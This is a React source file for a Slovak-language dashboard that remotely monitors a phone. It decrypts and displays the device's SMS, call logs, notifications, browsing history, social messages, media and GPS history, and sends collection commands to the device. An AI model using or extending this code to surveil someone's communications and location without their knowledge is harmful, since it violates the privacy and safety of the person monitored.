import { useParams, useNavigate } from 'react-router-dom'
import { db } from '../firebase'
import { ref, onValue, update } from 'firebase/database'
import { useEffect, useState, useCallback } from 'react'
import MapView from '../components/MapView'
import UsageChart from '../components/UsageChart'
import CallLog from '../components/CallLog'
import SmsLog from '../components/SmsLog'
import NotificationList from '../components/NotificationList'
import MediaGallery from '../components/MediaGallery'
import HistoryBrowser from '../components/HistoryBrowser'
import { decryptBatch, getDecryptKey, storeDecryptKey } from '../utils/decrypt'

function toArray(val: any): any[] {
    if (!val) return []
    if (Array.isArray(val)) return val
    return Object.values(val)
}

export default function DeviceDashboard() {
    const { deviceId } = useParams<{ deviceId: string }>()
    const nav = useNavigate()
    const [rawData, setRawData] = useState<any>({})
    const [data, setData] = useState<any>({})
    const [scanInterval, setScanInterval] = useState(60)
    const [lastSeen, setLastSeen] = useState('')
    const [decryptKey, setDecryptKeyState] = useState<string>(() =>
        deviceId ? (getDecryptKey(deviceId) ?? '') : ''
    )
    const [keyInput, setKeyInput] = useState('')
    const [decrypting, setDecrypting] = useState(false)

    useEffect(() => {
        if (!deviceId) return
        const r = ref(db, `devices/${deviceId}`)
        // FIX: return unsubscribe function from onValue
        const unsub = onValue(r, s => {
            const val = s.val() || {}
            setRawData(val)
            // FIX: interval ?? 60
            setScanInterval(val.interval ?? 60)
            if (val.lastSeen) setLastSeen(new Date(val.lastSeen).toLocaleString('sk'))
        })
        return unsub
    }, [deviceId])

    const applyDecrypt = useCallback(async (raw: any, keyHex: string) => {
        if (!keyHex) { setData(raw); return }
        setDecrypting(true)
        try {
            const decryptField = async (field: any) => {
                const arr = toArray(field)
                if (!arr.length) return field
                return await decryptBatch(arr, keyHex)
            }
            const decrypted = {
                ...raw,
                sms: await decryptField(raw.sms),
                calls: await decryptField(raw.calls),
                notifications: await decryptField(raw.notifications),
                browsing_history: await decryptField(raw.browsing_history),
                social_messages: await decryptField(raw.social_messages),
                media_files: await decryptField(raw.media_files),
                app_usage: await decryptField(raw.app_usage),
                location: raw.location
                    ? (await decryptBatch([raw.location], keyHex))[0]
                    : undefined,
                location_history: raw.location_history
                    ? await decryptBatch(toArray(raw.location_history), keyHex)
                    : []
            }
            setData(decrypted)
        } catch (e) {
            console.error('Decrypt error', e)
            setData(raw)
        } finally {
            setDecrypting(false)
        }
    }, [])

    useEffect(() => {
        applyDecrypt(rawData, decryptKey)
    }, [rawData, decryptKey, applyDecrypt])

    const handleSetKey = () => {
        if (!deviceId) return
        storeDecryptKey(deviceId, keyInput)
        setDecryptKeyState(keyInput)
    }

    const sendCommand = (type: string, extra: Record<string, any> = {}) => {
        if (!deviceId) return
        update(ref(db, `devices/${deviceId}/commands`), {
            ...extra, timestamp: Date.now(), type
        })
    }

    const changeInterval = (mins: number) => {
        setScanInterval(mins)
        sendCommand('UPDATE_INTERVAL', { interval_minutes: mins })
    }

    const isOnline = rawData.lastSeen && Date.now() - rawData.lastSeen < 120_000

    const btnStyle: React.CSSProperties = {
        background: '#2a2a2a', color: '#fff', border: '1px solid #444',
        borderRadius: 6, padding: '6px 14px', cursor: 'pointer', fontSize: 13
    }

    return (
        <div style={{ maxWidth: 1100, margin: '24px auto', fontFamily: 'sans-serif', color: '#fff', padding: '0 16px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16, flexWrap: 'wrap', gap: 12 }}>
                <button onClick={() => nav('/devices')} style={{ background: 'none', border: 'none', color: '#888', cursor: 'pointer', fontSize: 14 }}>
                    ← Späť
                </button>
                <div style={{ textAlign: 'right' }}>
                    <b style={{ fontSize: 18 }}>{deviceId}</b>
                    <div style={{ fontSize: 12, color: '#888', marginTop: 4 }}>
                        <span style={{ color: isOnline ? '#22c55e' : '#ef4444' }}>
                            ● {isOnline ? 'Online' : 'Offline'}
                        </span>
                        {' '}· Batéria: {rawData.battery ?? '?'}%
                        {' '}· Posledný kontakt: {lastSeen || '?'}
                    </div>
                </div>
            </div>

            <div style={{ display: 'flex', gap: 8, marginBottom: 16, alignItems: 'center', flexWrap: 'wrap' }}>
                <span style={{ fontSize: 12, color: '#888' }}>Decrypt key (hex):</span>
                <input
                    type="password"
                    placeholder="64-char hex key from pairing"
                    value={keyInput}
                    onChange={e => setKeyInput(e.target.value)}
                    style={{
                        background: '#1a1a1a', border: '1px solid #444',
                        borderRadius: 6, color: '#fff', padding: '4px 10px', fontSize: 12, width: 260
                    }}
                    onKeyDown={e => e.key === 'Enter' && handleSetKey()}
                />
                <button onClick={handleSetKey} style={btnStyle}>Apply</button>
                {decryptKey && (
                    <span style={{ color: '#22c55e', fontSize: 11 }}>
                        {decrypting ? '🔓 Decrypting...' : '✓ Key set'}
                    </span>
                )}
            </div>

            <div style={{ display: 'flex', gap: 8, marginBottom: 24, flexWrap: 'wrap' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <label style={{ fontSize: 12, color: '#888' }}>Interval:</label>
                    <select
                        value={scanInterval}
                        onChange={e => changeInterval(Number(e.target.value))}
                        style={{ background: '#2a2a2a', color: '#fff', border: '1px solid #444', borderRadius: 6, padding: '4px 8px' }}>
                        {[15, 30, 60, 180, 360, 720, 1440].map(m => (
                            <option key={m} value={m}>{m < 60 ? `${m}min` : `${m / 60}h`}</option>
                        ))}
                    </select>
                </div>
                <button onClick={() => sendCommand('SYNC_NOW')} style={btnStyle}>🔄 Sync</button>
                <button onClick={() => sendCommand('FORCE_COLLECT')} style={btnStyle}>📥 Zbierať</button>
                <button onClick={() => sendCommand('COLLECT_LOCATION')} style={btnStyle}>📍 GPS</button>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 24 }}>
                <div style={{ gridColumn: '1/-1' }}>
                    <MapView location={data?.location} history={data?.location_history} />
                </div>
                <UsageChart usage={data?.app_usage} />
                <NotificationList notifications={data?.notifications} />
                <CallLog calls={data?.calls} />
                <SmsLog sms={data?.sms} />
                <HistoryBrowser history={data?.browsing_history} />
                <div style={{ gridColumn: '1/-1' }}>
                    <MediaGallery media={data?.media_files} />
                </div>
            </div>
        </div>
    )
}
